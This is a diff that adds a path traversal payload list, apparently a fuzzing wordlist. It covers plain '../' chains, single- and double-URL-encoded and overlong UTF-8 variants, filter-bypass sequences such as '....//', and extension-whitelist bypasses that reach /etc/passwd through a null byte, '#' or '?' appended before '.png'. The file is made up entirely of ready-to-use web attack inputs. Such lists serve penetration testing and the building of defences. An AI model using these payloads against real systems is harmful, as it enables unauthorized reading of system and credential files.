@@ -1,0 +1,39 @@
+# === Basic ../ ===
+../
+../../
+../../../
+../../../../
+../../../../../
+../../../../../../
+
+# === Encoded ===
+..%2f
+%2e%2e%2f
+..%252f
+%2e%2e/
+..\
+..%5c
+%2e%2e%5c
+
+# === Double encoding ===
+%252e%252e%252f
+%252e%252e/
+..%c0%af
+..%c1%9c
+
+# === Filter bypass — non-recursive replace ===
+....//
+....\\\\
+....\/
+..../\
+..;/
+..//
+
+# === Whitelist bypass — extension append ===
+../../../etc/passwd%00.png
+../../../etc/passwd#.png
+../../../etc/passwd?.png
+
+# === UTF-8 overlong ===
+%c0%2e%c0%2e/
+%e0%80%ae%e0%80%ae/
